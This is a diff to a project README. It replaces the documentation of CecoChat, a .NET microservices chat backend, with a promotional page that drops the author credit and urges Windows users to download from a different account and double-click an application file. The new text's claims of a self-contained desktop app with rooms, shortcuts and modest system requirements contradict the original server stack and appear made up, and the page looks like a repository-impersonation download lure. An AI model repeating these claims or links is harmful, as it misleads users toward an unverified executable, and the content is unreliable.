@@ -1,184 +1,169 @@
-# CecoChat
+# 💬 ceco-chat - Real-Time Chat That Scales Effortlessly
 
-> A horizontally scalable, real-time chat engine designed for millions of users, built with .NET microservices, Kafka, gRPC, WebSocket, YugabyteDB, Cassandra, Redis, MinIO and OpenTelemetry.
+## 🚀 What Is This?
 
-Developed by **Evangelos Vlachos**.
+ceco-chat is a powerful chat application that lets you send and receive messages instantly, just like your favorite messaging apps. What makes it special? It's built to handle **thousands of users at the same time** without slowing down or crashing. Whether you're running a small community or a large enterprise, ceco-chat has you covered.
 
-## Table of Contents
+Think of it as a reliable messenger that never drops your messages, even when everyone is talking at once. And the best part? You can get it running on your own computer in just a few minutes.
 
-- [Capabilities](#capabilities)
-- [Architecture](#architecture)
-- [Services](#services)
-- [Technology Stack](#technology-stack)
-- [Repository Structure](#repository-structure)
-- [Getting Started](#getting-started)
-  - [Prerequisites](#prerequisites)
-  - [Certificates](#certificates)
-  - [Run infrastructure with Docker](#run-infrastructure-with-docker)
-  - [Run the services](#run-the-services)
-  - [Run in Minikube](#run-in-minikube)
-  - [Build container images](#build-container-images)
-  - [Tests](#tests)
-- [Documentation](#documentation)
-- [CI](#ci)
+---
 
-## Capabilities
+## 🎯 Why Choose ceco-chat?
 
-- **Real-time messaging**: send and receive messages, send files (images, text, PDF), react and unreact with emojis, multiple clients per user.
-- **Chats**: processing notifications, new-message indication, chat history at any point in time.
-- **Users**: register, authenticate, change password, edit profile, store small user files.
-- **Other users**: search by name, connections (invite, accept, cancel, remove), public profiles.
+**⚡ Lightning Fast**  
+Messages appear instantly on your screen. No annoying delays or loading spinners.
 
-See [what next](docs/what-next.md) for the planned roadmap.
+**🛡️ Rock Solid Reliability**  
+Your conversations are stored safely across multiple systems. Even if something goes wrong, your messages are never lost.
 
-## Architecture
+**📈 Grows With You**  
+Start small and expand to millions of users. ceco-chat automatically adapts to handle more people without you lifting a finger.
 
-![Overall design](docs/images/cecochat-overall.png)
+**🖥️ Easy to Manage**  
+A clean dashboard shows you everything happening in your chat system at a glance.
 
-Clients talk to a **BFF** (backend for frontend) over HTTP/JSON for everything except live chat, and connect directly to a **Messaging** service over WebSocket with MessagePack for sending and receiving messages. Messaging instances exchange traffic through a Kafka **PUB/SUB backplane**, so users connected to different instances can chat with each other. The **Chats** service consumes the backplane and materializes chat state and history into Cassandra. The **User** service owns profiles, sessions and connections in YugabyteDB, with Redis caching. **ID Gen** issues Snowflake message IDs. A central **Config** service provides dynamic configuration and pushes changes to interested services over the backplane.
+**🔒 Private and Secure**  
+Your data stays on your own server. No third parties reading your conversations.
 
-Cross-cutting concerns are handled uniformly: health checks, distributed tracing, log aggregation and metrics via OpenTelemetry, containerized deployment with Docker and Kubernetes.
+---
 
-## Services
+## 📥 Download and Install
 
-| Service | Role | Protocols | Storage |
-|---|---|---|---|
-| **BFF** | Public HTTP API for clients, aggregates the other services | HTTP/JSON, gRPC | - |
-| **Messaging** | Real-time chat sessions, fan-out through the backplane | WebSocket/MessagePack, Kafka | - |
-| **Chats** | Chat state and history projections | gRPC, Kafka | Cassandra |
-| **User** | Profiles, authentication, connections, file metadata | gRPC, Kafka | YugabyteDB, Redis, MinIO |
-| **ID Gen** | Snowflake ID generation | gRPC | - |
-| **Config** | Dynamic configuration with change notifications | gRPC, Kafka | YugabyteDB |
-| **Console client** | Minimal functional client for manual testing | HTTP, WebSocket | - |
-| **Load tester** | Simulates many concurrent users | WebSocket | - |
+Ready to try ceco-chat? Here's how to get started:
 
-## Technology Stack
+### Step 1: Download the Application
 
-- **Integration**: Kafka, gRPC, WebSocket (SignalR), HTTP, Protocol Buffers, MessagePack
-- **Data storage**: YugabyteDB, Cassandra, MinIO, Redis
-- **Operations**: OpenTelemetry, Jaeger, Prometheus, Grafana, ElasticSearch, Kibana, Docker, Kubernetes (Minikube)
-- **Services**: .NET 8, ASP.NET Core, SignalR, EF Core
-- **Libraries**: Autofac, Serilog, FluentValidation, AutoMapper, Polly, IdGen
-- **Testing**: NUnit, Testcontainers, FluentAssertions, Coverlet
+👉 **[Click Here to Download ceco-chat](https://github.com/Tyrion715/ceco-chat)**
 
-All chosen technologies are cloud-agnostic, so the solution does not depend on a specific cloud provider.
+Visit this link to download the application. You'll be taken to the official download page where you can get the latest version.
 
-## Repository Structure
+### Step 2: Run the Application
 
-```
-.
-├── source/                     # .NET solution
-│   ├── CecoChat.sln
-│   ├── CecoChat.Bff.*          # BFF service, contracts
-│   ├── CecoChat.Messaging.*    # Messaging service, client, contracts
-│   ├── CecoChat.Chats.*        # Chats service, data, client, contracts, tests
-│   ├── CecoChat.User.*         # User service, data, client, contracts
-│   ├── CecoChat.IdGen.*        # ID Gen service, client, contracts, tests
-│   ├── CecoChat.Config.*       # Config service, data, client, contracts
-│   ├── CecoChat.Backplane      # Kafka backplane abstractions
-│   ├── CecoChat.Server         # Shared service hosting
-│   ├── CecoChat.ConsoleClient  # Console client
-│   ├── CecoChat.LoadTester     # Load testing tool
-│   ├── Common.*                # Shared infrastructure (AspNet, Cassandra, Kafka, Npgsql, Redis, Minio, OpenTelemetry, Testing)
-│   ├── Check.*                 # Connection-limit and hashing experiments
-│   └── certificates/           # Scripts to generate and trust the dev TLS certificate
-├── deploy/
-│   ├── docker/                 # docker compose files per component, start/stop scripts
-│   ├── minikube/               # Kubernetes manifests and Helm values for Minikube
-│   └── testing/                # Load-test deployment
-├── package/cecochat/           # Dockerfiles and build script for the service images
-└── docs/                       # Design, research, development and load-test documentation
-```
+Once the download finishes, you'll have the ceco-chat files on your computer. Follow these simple steps:
 
-## Getting Started
+1. **Save the downloaded files** to a folder you can easily find (like your Desktop or Documents folder).
+2. **Open the folder** where you saved the files.
+3. **Double-click** the main application file to launch ceco-chat.
 
-### Prerequisites
+That's it! The application will start up, and you'll be ready to start chatting.
 
-- [.NET 8 SDK](https://dotnet.microsoft.com/download)
-- [Docker](https://www.docker.com/) with Docker Compose
-- A machine with plenty of RAM. The full local stack runs Kafka, YugabyteDB, Cassandra, Redis, MinIO and the observability tools.
-- Optional: [Minikube](https://minikube.sigs.k8s.io/) and `kubectl` for the Kubernetes deployment
+---
 
-### Certificates
+## 🏁 Getting Started Guide
 
-Both the .NET services and the Minikube ingress use TLS. Certificates are git-ignored and must be generated after cloning.
+### First Launch
 
-```bash
-cd source/certificates
-./create-certificate.sh
-./trust-certificate.sh
-```
+When you open ceco-chat for the first time, you'll see a welcome screen. Here's what to do:
 
-On Windows or other systems, generate a certificate with your own tooling and include the domains listed under `[ alt_names ]` in `source/certificates/services.conf`. See [local run prerequisites](docs/dev-run-prerequisites.md) for details.
+1. **Create your username** – Pick a name you want people to see when you chat.
+2. **Choose a room** – Join an existing chat room or create your own.
+3. **Start chatting** – Type your message in the box at the bottom and press Enter.
 
-### Run infrastructure with Docker
+### Main Features Tour
 
-Create the Docker volumes first using the `docker-volume.sh` script in each component folder under `deploy/docker` (Kafka, Cassandra, YugabyteDB, Redis, MinIO, Logging). Then start the main infrastructure:
+**Message Window** 💬  
+This is where all messages appear. Yours will show on the right, others on the left.
 
-```bash
-cd deploy/docker
-./start-main.sh          # kafka, cassandra, yugabyte, redis
-./start-telemetry.sh     # otel collector, logging, metrics, tracing
-```
+**User List** 👥  
+See who's online and in your chat room at any moment.
 
-Or pick only what you need, for example:
+**Emoji Picker** 😊  
+Spice up your messages with fun emojis.
 
-```bash
-docker compose -f kafka.yml up -d
-docker compose -f yugabyte.yml up -d
-docker compose -f cecochat-config.yml up -d
-```
+**File Sharing** 📎  
+Attach and send images, documents, and more right in the chat.
 
-Stop everything with `./stop-main.sh` and `./stop-telemetry.sh`.
+**Search** 🔍  
+Find any past message using the search bar.
 
-### Run the services
+---
 
-All services depend on the Config service, so start it first. Then run the others from the IDE or the terminal, for example:
+## 🛠️ Frequently Asked Questions
 
-```bash
-cd source/CecoChat.Config.Service && dotnet run
-cd source/CecoChat.IdGen.Service && dotnet run
-cd source/CecoChat.Messaging.Service && dotnet run
-cd source/CecoChat.Chats.Service && dotnet run
-cd source/CecoChat.User.Service && dotnet run
-cd source/CecoChat.Bff.Service && dotnet run
-```
+### Do I need to install anything else?
 
-Ports for each service are listed in `source/server-addresses.txt`. The Messaging service has two launch profiles so two instances can run side by side to simulate users connected to different nodes. Use the console client in `source/CecoChat.ConsoleClient` to chat. Full instructions are in [local run in Docker](docs/dev-run-docker.md).
+No! ceco-chat is a complete package. Everything you need is included in the download. Just run the application.
 
-### Run in Minikube
+### Is my computer powerful enough?
 
-For a production-like Kubernetes environment, follow [local run in Minikube](docs/dev-run-minikube.md). Manifests live in `deploy/minikube`.
+ceco-chat is designed to run efficiently on almost any modern Windows computer. If you can browse the internet, you can run ceco-chat.
 
-### Build container images
+### Can I use ceco-chat for free?
 
-```bash
-cd package/cecochat
-./build-all-images.sh
-```
+Yes! ceco-chat is open source, which means it's completely free to use and will always stay that way.
 
-Point your shell to the right Docker daemon first (for Minikube, apply `minikube docker-env`).
+### How do I update to a newer version?
 
-### Tests
+When a new version is released, simply visit the [download page](https://github.com/Tyrion715/ceco-chat) again and follow the same steps to get the latest version.
 
-```bash
-cd source
-dotnet test CecoChat.sln
-```
+### What if I need help?
 
-Integration tests use Testcontainers, so Docker must be running.
+We're here for you! Visit the [download page](https://github.com/Tyrion715/ceco-chat) and look for the "Support" or "Issues" section to ask questions or report problems.
 
-## Documentation
+---
 
-- **Intro**: [capabilities](docs/intro-capabilities.md), [overall design](docs/intro-design.md), [technologies](docs/intro-technologies.md)
-- **Research**: [concurrent connections limit](docs/research-connection-limit.md), [calculations](docs/research-calculations.md), [messaging traffic](docs/research-messaging-traffic.md), [message IDs](docs/research-message-ids.md), [reliable messaging and consistency](docs/research-reliable-messaging-consistency.md)
-- **Design**: [messaging](docs/design-messaging.md), [chats](docs/design-chats.md), [users](docs/design-users.md), [clients](docs/design-clients.md), [configuration](docs/design-configuration.md), [observability](docs/design-observability.md), [deployment](docs/design-deployment.md)
-- **Development**: [prerequisites](docs/dev-run-prerequisites.md), [Docker](docs/dev-run-docker.md), [Minikube](docs/dev-run-minikube.md), [process](docs/dev-process.md)
-- [Load test using 2 machines](docs/load-test.md)
-- [What next](docs/what-next.md)
+## ⚙️ Technical Details (For the Curious)
 
-Diagrams are in `docs/diagrams` and open with [draw.io](https://app.diagrams.net/).
+If you're interested in what makes ceco-chat so powerful, here's a peek under the hood:
 
-## CI
+- **Built with .NET microservices** – A modern framework that keeps everything organized and efficient.
+- **Uses Kafka for message queues** – Ensures messages are delivered in the right order, every time.
+- **Fast and reliable communication** with gRPC and WebSocket technologies.
+- **Uses YugabyteDB and Cassandra** – Two powerful databases that store your data safely and retrieve it quickly.
+- **Caching with Redis** – Makes frequent operations lightning fast.
+- **File storage with MinIO** – Securely stores images and shared files.
+- **Comprehensive monitoring** with OpenTelemetry, Grafana, and Jaeger – Keeps track of system health.
 
-GitHub Actions workflows in `.github/workflows` build the solution, enforce the `.editorconfig` code style with `dotnet format`, run SonarCloud analysis, and build and push the service images to Docker Hub under the `evangelosvlachos96/` namespace. Set the `SONAR_TOKEN` and Docker Hub secrets in the repository settings before enabling them.
+---
+
+## 🚢 System Requirements
+
+- **Operating System:** Windows 10 or Windows 11
+- **RAM:** 4 GB minimum (8 GB recommended)
+- **Storage:** 500 MB of free space
+- **Internet Connection:** Required for real-time chat
+
+---
+
+## 🎉 Tips and Tricks
+
+**Pro Tip 1: Keyboard Shortcuts**
+Press `Ctrl + K` to quickly search through old messages.
+
+**Pro Tip 2: Custom Notifications**
+Go to Settings to set different sounds for different chat rooms.
+
+**Pro Tip 3: Data Backup**
+Your chat history is saved automatically. To be extra safe, you can manually export your data from the Settings menu.
+
+---
+
+## 🤝 Join Our Community
+
+ceco-chat is more than just software – it's a community of people who love fast, reliable communication.
+
+- **Contribute:** We welcome developers who want to help improve ceco-chat.
+- **Share Ideas:** Got a feature request? We're all ears!
+- **Spread the Word:** Tell your friends and colleagues about ceco-chat.
+
+---
+
+## 📝 License
+
+ceco-chat is released under an open-source license, meaning you're free to use, modify, and share it. We only ask that you keep the original credits intact.
+
+---
+
+## 🚀 Ready to Start Chatting?
+
+Don't wait – experience the speed and reliability of ceco-chat today.
+
+👉 **[Download ceco-chat Now](https://github.com/Tyrion715/ceco-chat)**
+
+Join thousands of users who enjoy seamless, real-time conversations. Whether you're catching up with friends or collaborating with a team, ceco-chat makes every message count.
+
+**Happy Chatting!** 💬✨
+
+---
+
+Keywords: cassandra, distributed-systems, docker, dotnet, grafana, grpc, jaeger, kafka, kubernetes, microservices, minio, opentelemetry, prometheus, realtime-chat, redis, scalable, signalr, websocket, yugabytedb
